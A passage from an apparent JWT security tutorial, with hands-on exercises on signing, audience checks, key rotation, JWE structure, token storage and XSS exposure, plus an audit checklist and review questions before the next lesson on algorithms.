For each algorithm, predict the Base64URL-encoded signature length: HS256, HS512, RS256, ES256, EdDSA. Verify by signing tokens in your language of choice.

### Exercise 3: Two-issuer audit
You have two services: `api-a` and `api-b`. Both accept tokens from the same IdP. A user authenticates to `api-a` and gets a token with `aud=api-a`. They paste the token into a request to `api-b`. Does `api-b` accept it? Why or why not? What's the fix?

### Exercise 4: Build a JWT by hand
Without looking at Section 8, write 30 lines of Python that:
- Takes a payload dict + key bytes
- Returns a signed HS256 JWT
- Has the exact same output as PyJWT for the same inputs

### Exercise 5: Custom claim namespace
Design a custom claims schema for a multi-tenant SaaS app with: user roles, organization ID, feature flags, subscription tier. Use URI namespacing. Justify the URI choice.

### Exercise 6: The `kid` decision
Your IdP has 1 signing key today, but you're planning a 90-day rotation. Should you add `kid` to the header now? Why? What happens during the rotation if you don't?

### Exercise 7: Decode a JWE
Find a JWE-format token (most OIDC ID tokens are JWS, not JWE, but encrypted JWTs exist for things like `at+jwt` with `cnf` claims, or for SAML-to-JWT bridges). Decode the 5 parts. Which one is the IV? Which one is the auth tag? Which one is the encrypted key?

### Exercise 8: 5 fields, 5 meanings
A friend asks you "what's in a JWT?" — list the 5 most important fields and explain each in one sentence. Time yourself: under 60 seconds.

### Exercise 9: LocalStorage vs HttpOnly
Build a 30-line SPA (vanilla JS, no framework) that:
- (a) Stores a JWT in localStorage and uses it for API calls
- (b) Stores the JWT in memory, uses a refresh token in an HttpOnly cookie

For each, identify the XSS impact (i.e., what can an XSS attacker do?). Compare.

### Exercise 10: Audit your tokens
For every JWT in your current systems (if you have any):
- How long is the access token's lifetime?
- Does it carry sensitive PII?
- Where is it stored (cookie / localStorage / memory)?
- Does your verifier have an algorithm allowlist?
- Does it check `iss`? `aud`? `exp`?

Write down one improvement you'd make today.

---

## 13. Next Step

You can now read, write, and reason about any JWT. Next, we go deeper on the algorithm choice — when to pick HS256 vs RS256 vs ES256 vs EdDSA, the security/perf trade-offs, and the failure modes of each.

→ [[../stage1/02-algorithms|Stage 1.2 — JWT Algorithms: HS/RS/ES/PS/EdDSA]]

**Before you move on, verify you can answer these:**
1. What are the three parts of a JWT, and what's the exact input to the signature?
2. What's the difference between `sub` and `email`? Why does `sub` need to be opaque?
3. What is `kid`, and why is it essential for JWKS rotation?
4. What is `jti`, and what are two uses for it?
5. Why is putting a JWT in a URL bad?
6. What does the algorithm allowlist in the verifier protect against?
